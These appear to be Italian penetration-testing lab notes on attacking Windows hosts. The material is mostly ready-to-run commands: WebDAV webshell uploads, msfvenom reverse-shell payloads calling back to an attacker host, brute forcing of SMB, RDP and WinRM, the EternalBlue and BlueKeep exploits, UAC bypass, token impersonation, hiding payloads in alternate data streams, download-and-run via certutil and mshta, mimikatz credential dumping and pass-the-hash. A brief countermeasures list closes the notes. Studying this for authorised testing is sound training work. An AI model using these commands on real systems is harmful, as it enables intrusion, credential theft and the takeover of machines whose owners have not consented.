# Host & Network Penetration Testing: System/Host Based Attacks

## Exploiting Windows Vulnerabilities

### Exploiting Microsoft IIS WebDAV

#### WebDAV Exploitation

* Identificare se WebDAV è stato configurato sul server web IIS.
* È possibile eseguire un attacco brute-force sul server WebDAV per identificare credenziali legittime da utilizzare per l’autenticazione.
* Dopo aver ottenuto credenziali legittime, è possibile autenticarsi con il server WebDAV e caricare un payload .asp malevolo che può essere utilizzato per eseguire comandi arbitrari o ottenere una reverse shell sul target.

#### Tools

* **davtest** – Scansione, autenticazione e sfruttamento di server WebDAV.
* **cadaver** – Caricamento/scaricamento file, modifica, operazioni di spostamento/copia e gestione risorse su WebDAV.

#### Verifica presenza webdav

```
nmap -sV -sC 10.2.17.124
nmap -sV -p 80 --script=http-enum 10.2.17.124
```

#### Hydra: Brute force web authentication form

```
hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt 10.2.17.124 http-get /webdav/
// http-get è il tipo di richiesta, mentre /webdav/ è la pagina dove si trova l'authentication form
```

> Attenzione che i bruteforce possono causare denial of service, e sarebbe meglio fare recoinessance per capire prima quali sono gli utenti per avere più chance di trovare poi le password e quindi delle credenziali valide.

#### davtest: Identificare estensioni file eseguibili e operazioni supportate da WebDav

```
davtest -auth bob:password_123321 -url http://10.2.17.124/webdav
```

#### cadaver: Caricare una webshell su WebDav

```
cadaver http://10.2.17.124/webdav
// chiede poi username e password, e ci connette alla directory
put /usr/share/webshells/asp/webshell.asp
// apriamo la pagina web http://10.2.17.124/webdav e clicchiamo sul file webshell.asp appena caricato e inviamo i comandi a noi utili.
```

#### Ottenere una reverse shell/meterpeter session su webdav con asp

```
service postgresql start && msfconsole
search iis upload
use exploit/windows/iis/iis_webdav_upload_asp
// di default va sul payload windows a 32bit, possiamo modificarlo se ci serve diverso
show options
set HttpUsername bob
set HttpPassword password_123321
set RHOSTS 10.2.30.233 //target ip
// potremmo dover cambiare la RPORT e SSL da false a true, a seconda dei casi. E anche LPORT se vogliamo
set PATH /webdav/metasploit.asp  //path dove caricherà il file asp
exploit
> sysinfo
> getuid
```

#### Creare payload per upload manuale meterpreter shell

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f asp > shell.asp
    // dove LHOST è l'IP della nostra macchina attaccante e LPORT è una porta sulla quale ascolteremo con netcat
// carichiamo il file asp creato
cadaver http://10.2.30.233/webdav
put /root/shell.asp
```

Apriamo il listener su altra finestra terminale:

```
service postgresql start && msfconsole
use multi/handler //modulo metasploit per settare un listner per il payload usato
set payload windows/meterpreter/reverse_tcp //stesso payload usato per generare il file asp
show options // impostiamo LPORT e LHOST con gli stessi valori usati per generare il file asp
set LHOST 10.10.5.2
set LPORT 1234
run
```

Clicchiamo sul file shell.asp caricato su http://10.2.30.233/webdav/ e otteniamo la reverse shell nella finestra con l'handler in ascolto.

```
// Infine eliminiamo le tracce sul server
delete shell.asp
ls
```



### Exploiting SMB with PSExec

#### Identifichiamo se la porta 445 è aperta e servizio attivo

```
nmap -sV -sC 10.2.24.221
nmap -p445 --script smb-protocols demo.ine.local //run nmap script to list the supported protocols and dialects of a SMB server
```

Se la porta 445 è aperta e quindi il servizio SMB è attivo, e lo script ci dice che viene usato smb version 2 e message signing is enabled but not required, significa che possiamo autenticarci via PsExec.

#### Bruteforce SMB con modulo Metasploit Framework

```
service postgresql start && msfconsole
search smb_login
use auxiliary/scanner/smb/smb_login
show options
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set RHOSTS 10.2.24.221
set VERBOSE false //così mostra solo le credenziali che avranno successo invece di tutte
run
```

è possibile specificare SMBDomain se il target fa parte di un dominio ed è importante, e anche SMBUser e SMBPassword se abbiamo le credenziali per l'autenticazione.

#### Autenticarci via PsExec con le credenziali trovate

```
psexec.py Administrator@10.2.24.221 cmd.exe
//e ci chiede la password che in questo caso è qwertyuiop
```

#### Ottenere una meterpreter session con modulo MSF

```
search psexec
use exploit/windows/smb/psexec
show options
set RHOSTS 10.2.24.221
set SMBUser Administrator
set SMBUser qwertyuiop
exploit
```

{% hint style="info" %}
**NB: In questo caso viene caricato un file (payload) sul target quindi potrebbe essere individuato, mentre via PsExec non lasciamo traccia**
{% endhint %}

### Exploiting EternalBlue (MS17-010) - SMB

<figure><img src="../.gitbook/assets/image (254).png" alt=""><figcaption></figcaption></figure>

#### Scan Nmap per vedere OS e porta SMB

```
sudo nmap -sV -p 445 -O 10.10.10.12
```

#### Scan Nmap per verificare se SMB è vulnerabile a EternalBlue

```
sudo nmap -sV -p 445  --script=smb-vuln-ms17-010 10.10.10.12
```

#### Per verificare se è vulnerabile

è possibile utilizzare questo modulo auxiliary:

```
use auxiliary/scanner/smb/smb_ms17_010
```

#### Exploit manuale con AutoBlue-MS17-010

Seguire le indicazioni sul github ed eventualmente gli appunti dettagliati.

{% embed url="https://github.com/3ndG4me/AutoBlue-MS17-010" %}

#### Exploit automatico con Metasploit Framework

```
msfconsole
search eternalblue
use exploit/windows/smb/ms17_010_eternalblue
set RHOSTS 10.10.10.12 //target IP
exploit
```

### Exploiting RDP

#### Scan porte con modulo MSF

```
msfconsole
search rdp_scanner
use auxiliary/scanner/rdp/rdp_scanner
show options
set RHOSTS 10.2.24.86
set RPORT 3333 //la porta che ipotizziamo abbia aperto il servizio RDP
run
```

#### Hydra: Bruteforce a RDP per trovare le credenziali

```
hydra -L /usr/share/metasploit-framework/data/wordlists/common_users.txt -P /usr/share/metasploit-frameworj/data/wordlists/unix_passwords.txt rdp://10.2.24.86 -s 3333
// dove 3333 è la porta RDP, se non la specifichiamo con -s hydra assume la porta di default
```

{% hint style="info" %}
ATTENZIONE: regolare la brute force speed in casi reali usando -t 2 or-t 3
{% endhint %}

#### Autenticarci via RDP (connetterci con xfreerdp)

```
xfreerdp /u:administrator /p:qwertyuiop /v:10.2.24.86:3333
// confermiamo con YES che ci fidiamo del certificato
```

### BlueKeep (CVE-2019-0708) - RDP

<figure><img src="../.gitbook/assets/image (255).png" alt=""><figcaption></figcaption></figure>

Deve essere abilitato RDP e disabilitata la Network Level authentication. E quindi per mitigare si può abilitare la Network Level Authentication.

{% hint style="info" %}
**Modificare ed eseguire codice al kernel level è probabile risulti in crash del sistema.**
{% endhint %}

#### Test porta RDP 3389 aperta

```
sudo nmap -p 3389 10.10.10.7
```

#### Verifica se target è vulnerabile con modulo MSF

```
msfconsole
search BlueKeep
use auxiliary/scanner/rdp/cve_2019_0708_bluekeep
set RHOSTS <IP target>
run
```

#### Esecuzione exploit su target vulnerabile

```
use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
show options
set RHOSTS 10.10.10.7
show targets
set target 2
```

è uno staged payload, e funziona solo su Windows a 64 bit.

Nel nostro caso il target è un Windows 7 SP1 build 7601 x64 su Virtualbox. Quindi impostiamo il numero 2.

Aspettiamo di capire se sta funzionando, ha settato la dimensione del CHUNK grooming strategy (groom size) a 250MB, ma questo dipende dalla RAM allocata per la macchina target, quindi potrebbe essere da cambiare. Se questo valore è troppo alto può causare il crash della macchina target.

{% hint style="info" %}
**In casi reali in cui abbiamo come target un sistema di una azienda bisogna assolutamente fare attenzione ad avviare degli exploit che sfruttano il kernel. Perché possono causare crash e perdite di memoria.**
{% endhint %}

### Exploiting WinRM

#### Verificare se il servizio WinRM è attivo

```
nmap -sV -p 5985 10.2.18.45
```

Le porte di WinRM sono escluse dalle 1000 porte più comuni per cui nmap fa lo scan di default.

#### Crackmapexec: Bruteforce credenziali WinRM

```
crackmapexec winrm 10.2.18.45 -u administrator -p /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
```

Possiamo usarlo anche per mssql, smb e ssh.

#### Bruteforce credenziali con modulo Metasploit

```
msfconsole -q
use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
```

#### Crackmapexec: Eseguire comandi sul target

```
crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "whoami"
crackmapexec winrm 10.2.18.45 -u administrator -p tinkerbell -x "systeminfo"
```

#### evil-winrm: Ottenere una sessione shell sul target

```
evil-winrm.rb -u administrator -p tinkerbell -i 10.2.18.45
```

#### Ottenere una meterpreter shell con modulo MSF

```
service postgresql start && msfconsole
search winrm_script
use exploit/windows/winrm/winrm_script_exec
show options
set RHOSTS 10.2.18.45
set FORCE_VBS true
set USERNAME administrator
set PASSWORD tinkerbell
exploit
```

## Windows Privilege Escalation

### Windows Kernel Exploits

#### Privilege Escalation automatica con MSF

In una sessione meterpreter shell digitare:

```
getsystem
```

#### Modulo MSF per suggerire exploit

Avviandolo ci mostra tutte le vulnerabilità presenti in questa versione di windows, e mostrerà poi i moduli MSF per poter elevare i privilegi.

```
search suggester
use post/multi/recon/local_exploit_suggester
show options
sessions
set SESSION 3 //essendo un modulo per post exploitation inserire la sessione attiva da usare
run
```

Questi moduli possono essere usati dopo aver fatto una ricerca di quali versioni di windows sono vulnerabili e se la nostra del target è tra quelle.

Se fa uso del subsystem capiamo che si tratta di kernel exploit. Es. exploit/windows/local/ms16\_014\_wmi\_recv\_notif)

#### Utilizzare un modulo exploit suggerito per fare privesc automatica con MSF

```
use exploit/windows/local/ms16_014_wmi_recv_notif
set SESSION 3
set LPORT 4422 //in questo caso perché c'era una sessione attiva sulla porta 4444 preimpostata da MSF
exploit
```

#### Windows Exploit Suggester: Privesc manuale

1. Clonare Windows-Exploit-Suggester sul proprio ambiente
2. Aggiornare il db con **./windows-exploit-suggester.py --update**
3. Eseguire un comando systeminfo sul sistem target a cui abbiamo accesso non privilegiato e copiare l'output in un file
4. Eseguire il tool passandogli come argomento il database aggiornato e l'output di systeminfo: **./windows-exploit-suggester.py --database 2014-06-06-mssb.xlsx --systeminfo win7sp1-systeminfo.txt**

Per maggiori informazioni riferirsi agli appunti più dettagliati.

Di seguito solo un estratto di come installare il tool e aggiornarlo:

```
sessions
sessions 3
getuid
shell
systeminfo
//copiamo il contenuto in un file, ad esempio aprendo un nuovo terminale ed eseguendo:
    cd Desktop
    vim win7.txt
    //incolla il contenuto
    :wq
    cd Windows-Enum/Windows-Exploit-Suggester //cartella dove abbiamo clonato il tool
    ./windows-exploit-suggester.py --update
    ./windows-exploit-suggester.py --database 2021-12-26.mssb.xls --system info /Desktop/win7.tzt
```

### Bypassare UAC con UACMe

#### Exploit vulnerabilità webserver HFS 2.3 per avere accesso al target <a href="#exploit-vulnerabilita-webserver-hfs-2.3-per-avere-accesso-al-target" id="exploit-vulnerabilita-webserver-hfs-2.3-per-avere-accesso-al-target"></a>

```
service postgresql start && msfconsole
setg RHOSTS 10.2.22.220
search rejetto
use exploit/windows/http/rejetto_hfs_exec
show options
// Eventualmente settare TARGETURI ma in questo caso il servizio vulnerabile gira sulla root del webserver
exploit
```

#### Dopo aver avuto accesso alla vittima

```
sysinfo //versione windows e vediamo che meterpreter gira su un processo a 32 bit
pgrep explorer //es. risultato 2448
migrate 2448 //Migriamo la meterpreter shell su un processo a 64 bit
sysinfo
getuid
getprivs
shell
net user //ci fa vedere che account ci sono
net localgroup administrators //vediamo che l'utente admin fa parte del gruppo
net user admin password123 //ci da errore perché dobbiamo bypassare UAC

```

#### UACMe

Compilare il file eseguibile akagi32 o akagi64 (Akagai64) [https://github.com/hfiref0x/UACME](https://github.com/hfiref0x/UACME)

#### Attacco con msfvenom + UACMe per bypassare l'UAC

1. Generiamo un meterpeter payload con msfvenom
2. Lo trasferiamo al target
3. Usiamo l'akagai executable con la Key (metodo) numero 23
4. Eseguiamo il meterpreter payload che dovrebbe bypassare l'UAC
5. Ci verrà fornita una elevated meterpreter session sul nostro listener

**Passo 1: Generare un payload e aprire il listener**

```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > backdoor.exe
//LHOST è il nostro IP attaccante
ls
msfconsole //apriamo una nuova sessione MSF per impostare un listneer
use multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 10.10.5.2
set LPORT 1234
run
// e qui rimane in attesa di qualche collegamento, rimane listening. 
// Cambiamo finestra del terminale per fare le prossime operazioni
```

**Passo 2: Caricare il payload sul target ed eseguirlo per ricevere una reverse shell**

<pre><code><strong>// Torniamo sulla sessione meterpreter aperta tramite l'exploit di prima, dove siamo utenti admin sul target
</strong><strong>pwd
</strong>getuid
getprivs
cd C:\\
mkdir Temp
cd Temp
upload backdoor.exe
upload /root/Desktop/tools/UACME/Akagai64.exe
shell
dir
.\Akagi64.exe 23 C:\Temp\backdoor.exe
</code></pre>

**Passo 3: Sessione con privilegi elevati aperta tramite reverse shell**

```
sysinfo //connessione aperta correttamente, processo a 32bit
getuid //siamo sempre utenti admin
getprivs //abbiamo ora molti più privilegi
ps //guardiamo i processi attivi, e possiamo migrare a quelli SYSTEM
migrate 688 //processo di lsass eseguito come SYSTEM
sysinfo //siamo passati a un processo a 64 bit, quello di lsass
getuid //abbiamo ora NT AUTHORITY\SYSTEM
```

### Access Token Impersonation

Possibile se presente il privilegio: **SeImpersonatePrivilege**

#### Ottenere accesso iniziale al target

Viene ripetuto quanto fatto con UAC per avere accesso alla vittima sfruttando una vulnerabilità di Rejetto HFS 2.3, è solo un esempio.

#### Caricare il modulo incognito sul target da meterpreter shell

```
load incognito
list_tokens -u
impersonate_token "ATTACKDEFENSE\Administrator"  //tra gli elencati dal comando sopra
getuid
getprivs
pgrep explorer
migrate 3512  //ID processo explorer
getprivs
getuid
```

Una volta ottenuto accesso come Administrator possiamo passare anche ad altri token

```
impersonate_token "NT AUTHORITY SYSTEM"
```

## Windows File System Vulnerabilities

### Alternate Data Stream (Resource Stream)

è possibile creare dei file nascosti dietro ad altri file legittimi, attraverso lo sfruttamento dei metadati del file legittimo. Utile a nascondere degli exploit.

Possiamo creare un file nascosto se lo scriviamo come secondo file a seguito di due punti (:), ossia:

```
notepad test.txt:secret.txt
```

#### Esempio di attacco <a href="#attacco" id="attacco"></a>

Abbiamo il file binario di winPEAS che serve a fare local enumeration su sistema windows per identificare vulnerabilità che possono essere exploitate per poter fare privilege escalation.

Lo usiamo come esempio di payload, rinominandolo appunto payload e spostandolo in una cartella C:\Temp

```
type payload.exe > windowslog.txt:winpeas.exe
notepad windowslog.txt
start windowslog.txt:winpeas.txt //Risulta in: Access is Denied
//Creiamo un symbolic link in system32 in modo da poter avviare il programma altrimenti non funziona:
mklink wupdate.exe C:\Temp\windowslog.txt:winpeas.exe
wupdate //E ci viene eseguito winpeas che era il nostro payload
```

## Windows Credential Dumping

### Windows Password Hashes

<figure><img src="../.gitbook/assets/image.png" alt=""><figcaption></figcaption></figure>

Prima si fa privilege escalation, e poi con la sessione amministrativa si fa il dump delle credenziali.

Tool come mimikatz vanno a leggere la cache del processo LSASS che interagisce con LSA per avere una copia degli hash NTLM.

#### LM Hash

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

### NTLM Hash

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

Non hanno password salts, quindi possono essere craccate con brute force e rainbow attack.

### Searching For Passwords In Windows Configuration Files

* The Unattended Windows Setup utility will typically utilize one of the following configuration files that contain user account and system configuration information:
  * `C:\Windows\Panther\Unattend.xml`
  * `C:\Windows\Panther\Autounattend.xml`
* As a security precaution, the passwords stored in the Unattended Windows Setup configuration file may be encoded in base64.

#### Esempio di attacco avendo accesso parziale alla macchina vittima

#### Macchina attaccante: generazione meterpreter payload e caricamento su http server

```
//Generare un peterpreter payload con msfvenom
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.10.5.2 LPORT=1234 -f exe > payload.exe
//Carichiamo il file sulla macchina vittima tramite http server
python -m SimpleHTTPServer 80
```

#### Macchina vittima: Download payload meterpreter

```
cd Desktop
certutil -f http://10.10.5.2/payload.exe payload.exe
```

#### Macchina attaccante: Stoppiamo il server HTTP e avviamo Metasploit Framework per avere il multi handler in ascolto per quando avvieremo il payload sulla vittima

```
service postgresql start && msfconsole
use multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LPORT 1234
set LHSOT 10.10.5.2
run
//andiamo sulla vittima e clicchiamo per eseguire il payload.exe e ci arriva una connessione
```

#### Macchina attaccante: Riceviamo la meterpreter session sul multi/handler

```
sysinfo
search -f Unattend.xml //ovviamente è più comodo farlo a mano sapendo dov'è
cd C:\Windows\Panther
dir
download Unattend.xml
//ci spostiamo in un altro terminale per poter leggere il file senza chiudere MSF
cat Unattended.xml
// se andiamo in fondo al file troviamo un tag xml <AutoLogon> che contiene username e password encoded in Base64
// copiamo la password
vim password.txt //creiamo un nuovo file e la incolliamo dentro (usciamo con :wq)
//usiamo il tool base64 presente in Kali per decodificare la password
base64 -d password.txt
//verifichiamo che la password ottenuta sia ancora valida connettendoci con psexec
psexec.py Administrator@10.2.27.165 //alternativa: modulo psexec di MSF invece che in py
    whoami
```

Potrebbe essere che l'amministratore abbia cambiato la password dopo l'installazione e che quindi questa sia obsoleta

### Alternativa per trovare password in file Unattended usando PowerSploit

This lab covers usage of **PowerUp.ps1** Powershell script to find a common Windows privilege escalation flaw.

**PowerSploit**: PowerSploit is a collection of Microsoft PowerShell modules that can be used to aid penetration testers during all phases of an assessment.

**PowerUp.ps1:** PowerUp aims to be a clearing house of common Windows privilege escalation vectors that rely on misconfigurations.

Source: https://github.com/PowerShellMafia/PowerSploit

***

#### **Aprire il powershell della macchina attaccante ed eseguire PowerUp.ps1  per trovare le vulnerabilità sfruttabili per privilege escalation**

```
cd .\Desktop\PowerSploit\Privesc\
ls
powershell -ep bypass (PowerShell execution policy bypass)
. .\PowerUp.ps1
Invoke-PrivescAudit
```

We can notice that there is an **Unattend.xml** file present on the system. Open the **Unattend.xml** file.

#### **Leggiamo il file Unattended.xml**

```
cat C:\Windows\Panther\Unattend.xml
```

We have discovered an administrator encoded password. i.e **“QWRtaW5AMTIz”**.

#### Decodifichiamo la password utilizzando Powershell

```
$password='QWRtaW5AMTIz'
$password=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($pa
ssword))
echo $password
```

The administrator password is **“Admin@123”**.

#### Avviamo un command prompi come administrator con le credenziali scoperte

```
runas.exe /user:administrator cmd
Admin@123
whoami
```

#### Macchina attaccante: Eseguire il modulo MSF hta\_serverper ottenre una meterpreter shell

```
msfconsole -q
use exploit/windows/misc/hta_server
exploit
```

Copy the generated payload i.e **“http://10.10.31.2:8080/Bn75U0NL8ONS.hta”** and run it on the victim cmd.exe with mshta command to gain the meterpreter shell.

#### Macchina vittima: eseguire nel CMD administrator mshta per ottenere la reverse shell

```
mshta.exe http://10.10.31.2:8080/Bn75U0NL8ONS.hta
```

Sulla macchina attaccante viene aperta una reverse shell (per trovarla provare _sessions -i 1_).

### Fare dump degli hash con Mimikatz o Kiwi

Kiwi ha come vantaggio che viene eseguito in memoria quindi non lascia artefatti o tracce sul target come mimikatz che dev'essere scaricato.

#### Primo step: exploitare un servizio vulnerabile per avere accesso al target

Ad esempio qui di seguito i comandi per sfruttare una vulnerabilità presente per un servizio web BadBlue 2.7 in esecuzione sulla porta 80.

```
nmap -sV 10.2.18.199
service postresql start && msfconsole
search badblue
use exploit/windows/(http/badblue_passthru
set RHOSTS 10.2.18.199
exploit
sysinfo
getuid
pgrep lsass
migrate 788
getuid
```

#### Kiwi

Kiwi è una built-in meterpreter extension.

```
load kiwi
? //comando di help
creds_all //creads_all per dumpare tutte le credenziali
lsa_dump_sam
lsa_dump_secrets
```

**creds\_all**: Possiamo vedere gli hash NTLM, wdigest e kerberos sono vuote, questo perché le versioni successive a Windows 8.1 non conservano password in cleartext in nessun modo.

**lsa\_dump\_sam**: ci mostra tutti gli hash NTLM che sono presenti e la SysKey, che può tornare utile più tardi. Abbiamo anche la SAMKey.

**lsa\_dump\_secrets**: ci restituisce la SysKey e in alcuni casi ci può fornire delle credenziali in cleartext.

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

Se si lavora con un ambiente Active Directory è possibile usare i comandi **kerberos\_ticket** e **golden\_ticket\_create**.

> <p align="center"><strong>password_change</strong> è un po' troppo da fare in un pentest, perché significa cambiare password ad utenti in produzione. Quindi non bisogna farlo in casi reali di penetration test.</p>

#### Mimikatz

Mimikatz è un eseguibile che bisogna avere sulla macchina target. Kali Linux lo mette già a disposizione nella cartella **/usr/share/windows-resources/mimikatz/x64/mimikatz.exe**.

Nella meterpreter session collegata alla vittima:

<pre><code>pwd 
cd C:\\
mkdir Temp
cd Temp
upload /usr/share/windows-resources/mimikatz/x64/mimikatz.exe
shell
  dir
<strong>  .\mimikatz.exe
</strong>  privilege::debug // se "20 OK" allora abbiamo i permessi per eseguire hash extraction from memory
  lsadump::sam //ci restituisce SysKey, SAMKey, NTLM degli utenti, RID
  lsadump::secrets
  sekurlsa::logonpasswords // se presenti in memoria le password usate nei login
</code></pre>

**sekurlsa::logonpasswords**: Con mimikatz possiamo mostrare le logon password usate se il sistema è stato configurato per tenerle in memoria.

### Pass-the-Hash attack

#### Punto di partenza

* Hai già una sessione su una macchina Windows (meterpreter) o solo l’hash.
* Rete raggiungibile via SMB verso il target.

#### Exploit di BadBlue (es. per ottenere una sessione SMB)

```
service postgresql start && msfconsole   //avvia Metasploit Framework
search badblue
use exploit/windows/http/badblue_passthru
set RHOSTS <IP target>
exploit
// otteniamo una sessione attiva di meterpreter
```

#### Ottenere l'hash (se ho già la sessione attiva)

In meterpreter trova il process id (PID) di lsass che è un processo a livello di sistema e usalo per migrare ai suoi privilegi:

```
pgrep lsass        # ottieni pid (es. 780)
migrate 780
getuid             # verifica NT AUTHORITY\SYSTEM
```

#### Estrarre l'hash con Kiwi o Mimikatz

```
load kiwi
lsa_dump_sam   # o lsa_dump_secrets/hashdump
hashdump
```

Salva le righe `username:LM:NTLM:RID` in un file .txt (es. `hashes.txt`).

> Nota: se l'LM è non usato apparirà il placeholder `aad3b435b51404eeaad3b435b51404ee`.

#### Scelta 1: Eseguire il pass-the-hash con psexec in MSF

Anzitutto mettere la sessione precedente in background con CTRL+Z e poi usiamo il modulo psexec:

```
search psexec
use exploit/windows/smb/psexec
show options
set LPORT 4422
set RHOSTS <target_IP>
set SMBUser Administrator
set SMBPass <LM_Hash>:<NTLM_Hash>
set target <tipo_target>   # es. Native\ upload o Command
exploit
```

Se fallisce, prova a cambiare `target` (es. `Command`) o il metodo di upload.

Se va a buon fine otterrai una sessione come `NT AUTHORITY\SYSTEM` sul target.

#### Scelta 2: Eseguire il pass-the-hash con CrackMapExec

```
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash>
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "whoami"
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "ipconfig"
crackmapexec smb 10.2.28.132 -u Administrator -H <NTLM_Hash> -x "net user administrator password123"
```

* CME accetta solo NTLM con `-H` (non serve LM).
* Utile per eseguire comandi rapidi senza caricare meterpreter.

#### Sicurezza e contromisure (breve)

* Abilitare LSA protection / Credential Guard.
* Disabilitare memorizzazione LM e usare policy forti.
* Monitorare tentativi SMB e movimenti laterali.
* Utilizzare MFA e credenziali gestite (LAPS).
